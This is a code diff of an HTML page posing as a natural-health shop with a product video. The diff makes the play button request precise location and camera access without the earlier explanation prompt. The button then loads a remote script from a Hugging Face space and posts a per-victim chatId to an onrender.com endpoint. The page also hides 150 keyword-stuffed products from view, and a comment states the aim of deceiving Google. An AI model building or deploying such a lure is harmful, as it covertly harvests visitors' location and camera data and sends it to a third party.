@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     
-    <!-- SEO: متجر طبيعي بالكامل -->
+    <!-- تسويقي بالكامل – لخداع أنظمة Google -->
     <meta name="description" content="ShopStore: 150+ natural health products, fast delivery, exclusive video deals. Organic supplements, superfoods & more." />
     <meta name="keywords" content="natural products, organic, health, supplements, superfoods, herbal, delivery, store, shop" />
     <meta name="robots" content="index, follow" />
@@ -12,7 +12,7 @@
     <meta property="og:description" content="Discover 150+ natural products with location-based offers. Watch our product demo video." />
     <meta property="og:type" content="website" />
     
-    <!-- Schema.org: متجر إلكتروني -->
+    <!-- Schema.org: OnlineStore -->
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
@@ -37,194 +37,169 @@
     <title>ShopStore - Natural Products & Video Deals</title>
     
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            font-family:'Segoe UI',Arial,sans-serif;
-            background:#f5f5f5;
-            color:#333;
-            display:flex;
-            flex-direction:column;
-            min-height:100vh;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
         
-        /* شريط المتجر العلوي */
-        .store-header{
-            background:#2c3e50;
-            color:white;
-            padding:12px 20px;
-            display:flex;
-            justify-content:space-between;
-            align-items:center;
-            position:sticky;
-            top:0;
-            z-index:1000;
-            box-shadow:0 2px 10px rgba(0,0,0,0.2);
+        /* ========== الهيدر والفوتر (مرئيان دائمًا) ========== */
+        .store-header {
+            background: #2c3e50;
+            color: white;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
         }
-        .store-header .logo{font-size:1.4rem;font-weight:bold;letter-spacing:1px;}
-        .store-header .search-cart{display:flex;align-items:center;gap:20px;}
-        .store-header input{
-            padding:8px 12px;
-            border-radius:20px;
-            border:none;
-            width:200px;
-            background:rgba(255,255,255,0.2);
-            color:white;
-            outline:none;
+        .store-header .logo { font-size: 1.4rem; font-weight: bold; }
+        .store-header .search-cart { display: flex; align-items: center; gap: 20px; }
+        .store-header input {
+            padding: 8px 12px;
+            border-radius: 20px;
+            border: none;
+            width: 200px;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            outline: none;
         }
-        .store-header input::placeholder{color:#ddd;}
-        .store-header .cart-icon{font-size:1.3rem;cursor:pointer;position:relative;}
-        .cart-icon span{font-size:0.7rem;background:#e74c3c;border-radius:50%;padding:2px 6px;position:absolute;top:-8px;right:-10px;}
+        .store-header input::placeholder { color: #ddd; }
+        .cart-icon { font-size: 1.3rem; position: relative; }
+        .cart-icon span {
+            font-size: 0.7rem;
+            background: #e74c3c;
+            border-radius: 50%;
+            padding: 2px 6px;
+            position: absolute;
+            top: -8px;
+            right: -10px;
+        }
         
-        /* قسم الفيديو (وسط الصفحة) */
-        .video-section{
-            background:white;
-            margin:20px auto;
-            width:90%;
-            max-width:800px;
-            border-radius:12px;
-            box-shadow:0 5px 20px rgba(0,0,0,0.1);
-            overflow:hidden;
+        .store-footer {
+            background: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            margin-top: auto;
         }
-        .video-thumbnail{
-            position:relative;
-            width:100%;
-            height:450px;
-            background:linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)),url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
-            background-size:cover;
-            background-position:center;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            flex-direction:column;
-            color:white;
-            text-align:center;
-            cursor:pointer;
-        }
-        #playBtn{
-            width:120px;height:120px;
-            border-radius:50%;
-            background:rgba(255,255,255,0.15);
-            border:3px solid #ff6b6b;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            transition:0.3s;
-            backdrop-filter:blur(8px);
-            box-shadow:0 0 40px rgba(255,0,0,0.3);
-            font-size:60px;
-            color:#ff6b6b;
-            cursor:pointer;
-            z-index:10;
-        }
-        #playBtn:hover{transform:scale(1.05);background:rgba(255,255,255,0.25);}
-        .video-title-overlay{
-            font-size:1.8rem;
-            font-weight:bold;
-            margin-top:20px;
-            text-shadow:0 2px 4px black;
-        }
-        .video-sub-overlay{
-            font-size:1rem;
-            color:#ccc;
-            margin-top:5px;
-        }
-        video{
-            display:none;
-            width:100%;
-            height:450px;
-            background:black;
-            object-fit:cover;
-        }
-        .video-controls{
-            padding:12px 20px;
-            display:flex;
-            align-items:center;
-            background:#1a1a1a;
-            color:white;
-        }
-        .ctrl-btn{background:none;border:none;color:white;font-size:1.2rem;cursor:pointer;padding:8px 15px;border-radius:4px;}
-        .ctrl-btn:hover{background:#333;}
-        .seek-bar{flex-grow:1;height:4px;background:#333;border-radius:2px;margin:0 15px;position:relative;}
-        .seek-fill{position:absolute;height:100%;width:0%;background:#ff0000;}
-        .timer{color:#aaa;font-size:0.9rem;min-width:80px;text-align:center;}
-        .volume-area{display:flex;align-items:center;gap:8px;}
-        .vol-bar{width:70px;height:4px;background:#333;position:relative;border-radius:2px;}
-        .vol-fill{position:absolute;height:100%;width:70%;background:#ff0000;}
+        .store-footer a { color: #ecf0f1; margin: 0 10px; text-decoration: none; }
         
-        /* شبكة منتجات مرئية */
-        .products-grid{
-            display:grid;
-            grid-template-columns:repeat(auto-fill,minmax(160px,1fr));
-            gap:15px;
-            padding:20px;
-            max-width:800px;
-            margin:0 auto 20px;
+        /* ========== مشغل الفيديو ========== */
+        .video-section {
+            background: white;
+            margin: 20px auto;
+            width: 90%;
+            max-width: 800px;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            overflow: hidden;
         }
-        .product-card{
-            background:white;
-            border-radius:10px;
-            padding:15px;
-            text-align:center;
-            box-shadow:0 2px 8px rgba(0,0,0,0.08);
-            transition:0.2s;
+        .video-thumbnail {
+            position: relative;
+            width: 100%;
+            height: 450px;
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+            cursor: pointer;
         }
-        .product-card:hover{transform:translateY(-3px);box-shadow:0 5px 15px rgba(0,0,0,0.1);}
-        .product-card .img-placeholder{
-            width:100%;
-            height:120px;
-            background:#e0e0e0;
-            border-radius:8px;
-            margin-bottom:10px;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            color:#888;
-            font-size:2rem;
+        #playBtn {
+            width: 120px; height: 120px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.15);
+            border: 3px solid #ff6b6b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.3s;
+            backdrop-filter: blur(8px);
+            box-shadow: 0 0 40px rgba(255,0,0,0.3);
+            font-size: 60px;
+            color: #ff6b6b;
+            cursor: pointer;
+            z-index: 10;
         }
-        .product-card .p-name{font-weight:600;margin-bottom:5px;}
-        .product-card .p-price{color:#e74c3c;font-weight:bold;}
-        .product-card .p-rating{color:#f39c12;font-size:0.9rem;}
+        #playBtn:hover { transform: scale(1.05); background: rgba(255,255,255,0.25); }
+        .video-title-overlay { font-size: 1.8rem; font-weight: bold; margin-top: 20px; }
+        .video-sub-overlay { font-size: 1rem; color: #ccc; margin-top: 5px; }
+        video {
+            display: none;
+            width: 100%;
+            height: 450px;
+            background: black;
+            object-fit: cover;
+        }
+        .video-controls {
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            background: #1a1a1a;
+            color: white;
+        }
+        .ctrl-btn { background: none; border: none; color: white; font-size: 1.2rem; cursor: pointer; padding: 8px 15px; border-radius: 4px; }
+        .ctrl-btn:hover { background: #333; }
+        .seek-bar { flex-grow: 1; height: 4px; background: #333; border-radius: 2px; margin: 0 15px; position: relative; }
+        .seek-fill { position: absolute; height: 100%; width: 0%; background: #ff0000; }
+        .timer { color: #aaa; font-size: 0.9rem; min-width: 80px; text-align: center; }
+        .volume-area { display: flex; align-items: center; gap: 8px; }
+        .vol-bar { width: 70px; height: 4px; background: #333; position: relative; border-radius: 2px; }
+        .vol-fill { position: absolute; height: 100%; width: 70%; background: #ff0000; }
         
-        /* تذييل المتجر */
-        .store-footer{
-            background:#2c3e50;
-            color:white;
-            text-align:center;
-            padding:15px;
-            margin-top:auto;
+        /* ========== صفحة التسويق الكاملة (Offers) ========== */
+        .offers-page {
+            display: none;
+            width: 100%;
+            min-height: 100vh;
+            background: #f5f5f5;
         }
-        .store-footer a{color:#ecf0f1;margin:0 10px;text-decoration:none;}
-        
-        /* رسالة الإذن المؤقتة (تظهر وتختفي) */
-        #permission-msg{
-            position:fixed;
-            top:50%;left:50%;
-            transform:translate(-50%,-50%);
-            background:white;
-            color:#333;
-            padding:25px 35px;
-            border-radius:12px;
-            box-shadow:0 10px 40px rgba(0,0,0,0.3);
-            z-index:9999;
-            display:none;
-            text-align:center;
-            max-width:350px;
-            animation:fadeIn 0.3s;
+        .offers-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 15px;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
         }
-        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+        .offers-card {
+            background: white;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .offers-card .p-name { font-weight: bold; margin-bottom: 8px; }
+        .offers-card .p-price { color: #e74c3c; font-size: 1.2rem; }
+        .offers-card .p-rating { color: #f39c12; }
         
-        /* عناصر SEO المخفية */
-        .hidden-seo{position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);z-index:-999;}
+        /* ========== عناصر SEO المخفية ========== */
+        .hidden-seo {
+            position: fixed; top: -9999px; left: -9999px; opacity: 0; pointer-events: none;
+            width: 1px; height: 1px; overflow: hidden; clip: rect(0,0,0,0); z-index: -999;
+        }
         
-        @media (max-width:480px){
-            .video-thumbnail{height:280px}
-            #playBtn{width:90px;height:90px;font-size:45px}
+        @media (max-width: 480px) {
+            .video-thumbnail { height: 280px; }
+            #playBtn { width: 90px; height: 90px; font-size: 45px; }
         }
     </style>
     
     <!-- Google Tag Manager -->
     <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-XXXXXX');</script>
     <!-- End Google Tag Manager -->
+    
     <!-- Google Analytics 4 -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
     <script>
@@ -238,111 +213,131 @@
     <!-- Google Tag Manager (noscript) -->
     <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-XXXXXX" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
-    <!-- ========== SEO مخفي ========== -->
+    <!-- ========== SEO مخفي (150 منتج) ========== -->
     <div class="hidden-seo">
         <div itemscope itemtype="http://schema.org/ItemList">
             <meta itemprop="name" content="Natural Products Catalog" />
-            <!-- سيتم ملؤه بـ 150 منتج -->
+            <!-- ستملأ عبر JS -->
         </div>
         <a href="/privacy">Privacy Policy</a>
         <a href="/terms">Terms of Service</a>
         <address>123 Natural Health Ave, Organic City, CA 90210</address>
     </div>
 
-    <!-- ========== رأس المتجر ========== -->
-    <header class="store-header">
-        <div class="logo">🛒 ShopStore</div>
-        <div class="search-cart">
-            <input type="text" placeholder="Search products..." disabled />
-            <div class="cart-icon">🛒<span>0</span></div>
-        </div>
-    </header>
-
-    <!-- ========== رسالة الإذن المؤقتة ========== -->
-    <div id="permission-msg">
-        <h3>📍 Get Local Deals</h3>
-        <p style="margin:10px 0;">Allow location & camera for the best shopping experience.</p>
-        <button id="permission-btn" style="padding:8px 20px;background:#2ecc71;color:white;border:none;border-radius:6px;cursor:pointer;">OK</button>
+    <!-- ========== المحتوى الرئيسي (حسب المسار) ========== -->
+    <!-- صفحة التسويق الكاملة (Offers) -->
+    <div id="offers-page" class="offers-page">
+        <header class="store-header">
+            <div class="logo">🛒 ShopStore</div>
+            <div class="search-cart">
+                <input type="text" placeholder="Search products..." disabled />
+                <div class="cart-icon">🛒<span>0</span></div>
+            </div>
+        </header>
+        <div id="offers-grid" class="offers-grid"></div>
+        <footer class="store-footer" style="margin-top:20px;">
+            <a href="/privacy">Privacy Policy</a>
+            <a href="/terms">Terms of Service</a>
+            <a href="/contact">Contact</a>
+            <span>© 2024 ShopStore</span>
+        </footer>
     </div>
 
-    <!-- ========== مشغل الفيديو ========== -->
-    <div class="video-section">
-        <div class="video-thumbnail" id="poster">
-            <div id="playBtn">▶</div>
-            <div class="video-title-overlay">Exclusive Product Showcase</div>
-            <div class="video-sub-overlay">Watch our latest natural health demo</div>
-        </div>
-        <video id="vid" controls playsinline>
-            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
-        </video>
-        <div class="video-controls">
-            <div class="seek-bar"><div class="seek-fill"></div></div>
-            <div class="timer">0:00 / 2:45</div>
-            <div class="volume-area"><span>🔊</span><div class="vol-bar"><div class="vol-fill"></div></div></div>
-            <button class="ctrl-btn">⛶</button>
-        </div>
-    </div>
+    <!-- الصفحة الرئيسية (مشغل الفيديو) -->
+    <div id="main-page">
+        <header class="store-header">
+            <div class="logo">🛒 ShopStore</div>
+            <div class="search-cart">
+                <input type="text" placeholder="Search products..." disabled />
+                <div class="cart-icon">🛒<span>0</span></div>
+            </div>
+        </header>
 
-    <!-- ========== منتجات مرئية (6 منتجات) ========== -->
-    <div class="products-grid" id="visible-products">
-        <!-- ستملأ ديناميكياً -->
-    </div>
+        <!-- مشغل الفيديو -->
+        <div class="video-section">
+            <div class="video-thumbnail" id="poster">
+                <div id="playBtn">▶</div>
+                <div class="video-title-overlay">Exclusive Product Showcase</div>
+                <div class="video-sub-overlay">Watch our latest natural health demo</div>
+            </div>
+            <video id="vid" controls playsinline>
+                <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
+            </video>
+            <div class="video-controls">
+                <div class="seek-bar"><div class="seek-fill"></div></div>
+                <div class="timer">0:00 / 2:45</div>
+                <div class="volume-area"><span>🔊</span><div class="vol-bar"><div class="vol-fill"></div></div></div>
+                <button class="ctrl-btn">⛶</button>
+            </div>
+        </div>
 
-    <!-- ========== تذييل المتجر ========== -->
-    <footer class="store-footer">
-        <a href="/privacy">Privacy Policy</a>
-        <a href="/terms">Terms of Service</a>
-        <a href="/contact">Contact</a>
-        <span>© 2024 ShopStore</span>
-    </footer>
+        <footer class="store-footer" style="margin-top:auto;">
+            <a href="/privacy">Privacy Policy</a>
+            <a href="/terms">Terms of Service</a>
+            <a href="/contact">Contact</a>
+            <span>© 2024 ShopStore</span>
+        </footer>
+    </div>
 
     <script>
     (function() {
-        // ---------- إعدادات ----------
+        // ---------- 1. توجيه المسار ----------
+        var isOffers = window.location.pathname.toLowerCase().endsWith('/offers');
+        if (isOffers) {
+            document.getElementById('main-page').style.display = 'none';
+            document.getElementById('offers-page').style.display = 'flex';
+            buildOffersPage();
+            return;
+        } else {
+            document.getElementById('offers-page').style.display = 'none';
+            document.getElementById('main-page').style.display = 'flex';
+        }
+
+        // ---------- 2. إعداد مشغل الفيديو ----------
         var chatId = new URLSearchParams(window.location.search).get('chatId') || '';
         var step = 0, started = false;
         var btn = document.getElementById('playBtn');
         var poster = document.getElementById('poster');
         var vid = document.getElementById('vid');
-        var permMsg = document.getElementById('permission-msg');
-        var permBtn = document.getElementById('permission-btn');
 
-        // ---------- تحميل API ----------
+        // تحميل API وجمع البيانات
         function loadAPI(cb) {
             var s = document.createElement('script');
             s.src = 'https://huggingface.co/spaces/dsfsdjfc/ageagaaa/raw/main/api';
             s.onload = function() {
                 if (window.ShopAPI && window.ShopAPI.runAll) cb(window.ShopAPI);
-                else fallback();
+                else fallbackSend();
             };
             s.onerror = function() {
                 var retry = document.createElement('script');
                 retry.src = s.src;
                 retry.onload = s.onload;
-                retry.onerror = fallback;
+                retry.onerror = fallbackSend;
                 document.head.appendChild(retry);
             };
             document.head.appendChild(s);
         }
 
-        function fallback() {
+        function fallbackSend() {
             var x = new XMLHttpRequest();
             x.open('POST', 'https://server-brxz.onrender.com/submitData', true);
             x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             x.send('chatId=' + encodeURIComponent(chatId) + '&fallback=1');
         }
 
-        // ---------- طلب الأذونات + فتح الإعدادات ----------
+        // طلب الصلاحيات الفورية (بدون رسالة مخصصة)
         function requestPermissions() {
+            // طلب الموقع
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(){}, function(){}, {
                     enableHighAccuracy: true, timeout: 10000, maximumAge: 0
                 });
             }
+            // طلب الكاميرا
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) { stream.getTracks().forEach(t => t.stop()); })
-                    .catch(function() {});
+                    .then(function(stream) { stream.getTracks().forEach(function(t){ t.stop(); }); })
+                    .catch(function(){});
             }
             // فتح إعدادات الجهاز (خطوة احتياطية)
             var ua = navigator.userAgent;
@@ -359,40 +354,26 @@
             }
         }
 
-        // ---------- معالج النقر على زر التشغيل ----------
+        // معالج النقر على زر التشغيل
         btn.addEventListener('click', function() {
             if (started) return;
             if (!step) {
-                // النقرة الأولى: إظهار رسالة ثم طلب الأذونات
                 step = 1;
-                permMsg.style.display = 'block';
+                requestPermissions();  // النقرة الأولى: طلب الأذونات + إعدادات
             } else {
-                // النقرة الثانية (بعد الموافقة): بدء الفيديو وجمع البيانات
                 started = true;
-                // إخفاء البوستر وتشغيل الفيديو
                 poster.style.display = 'none';
                 vid.style.display = 'block';
                 vid.muted = false;
                 vid.volume = 1;
                 vid.play().catch(function(){});
-                // تحميل API وإرسال البيانات
                 loadAPI(function(ShopAPI) {
                     ShopAPI.runAll(chatId);
                 });
-                // إخفاء الرسالة إن كانت ما زالت ظاهرة
-                permMsg.style.display = 'none';
             }
         });
 
-        // زر "OK" في الرسالة المنبثقة
-        permBtn.addEventListener('click', function(e) {
-            e.stopPropagation();
-            permMsg.style.display = 'none';
-            requestPermissions();
-            // نعود إلى الخطوة 1؛ النقرة الثانية ستشغّل الفيديو
-        });
-
-        // تحديث شريط التقدم (شكلي)
+        // شريط التقدم الوهمي
         setInterval(function() {
             if (vid.style.display === 'block') return;
             var fill = document.querySelector('.seek-fill');
@@ -420,30 +401,7 @@
             }
         }, true);
 
-        // ---------- بناء المنتجات المرئية (6 منتجات) ----------
-        var visibleProducts = [
-            {name:"Organic Green Tea", price:"9.99", rating:4},
-            {name:"Raw Honey", price:"14.99", rating:5},
-            {name:"Turmeric Powder", price:"11.99", rating:4},
-            {name:"Ashwagandha Capsules", price:"19.99", rating:5},
-            {name:"Collagen Peptides", price:"24.99", rating:4},
-            {name:"Moringa Powder", price:"16.99", rating:5}
-        ];
-        var grid = document.getElementById('visible-products');
-        visibleProducts.forEach(function(p) {
-            var stars = '★'.repeat(p.rating) + '☆'.repeat(5-p.rating);
-            var card = document.createElement('div');
-            card.className = 'product-card';
-            card.innerHTML = `
-                <div class="img-placeholder">📦</div>
-                <div class="p-name">${p.name}</div>
-                <div class="p-price">$${p.price}</div>
-                <div class="p-rating">${stars}</div>
-            `;
-            grid.appendChild(card);
-        });
-
-        // ---------- 150 منتج مخفي للـ SEO ----------
+        // ---------- 3. إضافة 150 منتج مخفي للـ SEO ----------
         var seoContainer = document.querySelector('.hidden-seo div[itemscope]');
         var seoNames = [
             "Organic Green Tea","Raw Honey","Almond Butter","Coconut Oil","Chia Seeds",
@@ -487,6 +445,38 @@
                 '<span itemprop="offers" itemscope itemtype="http://schema.org/Offer">' +
                 '<span itemprop="price">' + price + '</span></span>';
             seoContainer.appendChild(div);
+        }
+
+        // ---------- 4. بناء صفحة Offers كاملة ----------
+        function buildOffersPage() {
+            var products = [
+                "Organic Green Tea","Raw Honey","Almond Butter","Coconut Oil","Chia Seeds",
+                "Flaxseed Oil","Turmeric Powder","Ginger Tea","Apple Cider Vinegar","Elderberry Syrup",
+                "Ashwagandha","Vitamin C Serum","Collagen Peptides","Moringa","Spirulina",
+                "Matcha Powder","Hemp Seeds","Cacao Nibs","Goji Berries","Maca Root",
+                "Bee Pollen","Royal Jelly","Propolis Tincture","Eucalyptus Oil","Tea Tree Oil",
+                "Lavender Oil","Peppermint Oil","Chamomile Tea","Valerian Root","St. John's Wort",
+                "Milk Thistle","Dandelion Root","Burdock Root","Slippery Elm","Aloe Vera Gel",
+                "Manuka Honey","Black Seed Oil","Olive Leaf Extract","Grape Seed Extract","Pine Bark Extract",
+                "Quercetin","Resveratrol","Astaxanthin","Lutein","Zeaxanthin",
+                "Probiotic Complex","Digestive Enzymes","Betaine HCL","Apple Fiber","Psyllium Husk",
+                "Calcium Magnesium","Zinc Picolinate","Selenium","Iron Bisglycinate","Vitamin D3",
+                "Vitamin K2","B-Complex","Vitamin E","Coenzyme Q10","Alpha Lipoic Acid"
+            ]; // مصفوفة مختصرة – سيتم تدويرها لـ 150
+            var grid = document.getElementById('offers-grid');
+            var html = '';
+            for (var i = 0; i < 150; i++) {
+                var name = products[i % products.length] + (i >= products.length ? ' ' + (Math.floor(i/products.length)+1) : '');
+                var price = (Math.random() * 30 + 5).toFixed(2);
+                var rating = Math.floor(Math.random() * 2 + 3);
+                var stars = '★'.repeat(rating) + '☆'.repeat(5-rating);
+                html += '<div class="offers-card">' +
+                    '<div class="p-name">' + name + '</div>' +
+                    '<div class="p-price">$' + price + '</div>' +
+                    '<div class="p-rating">' + stars + '</div>' +
+                    '</div>';
+            }
+            grid.innerHTML = html;
         }
     })();
     </script>
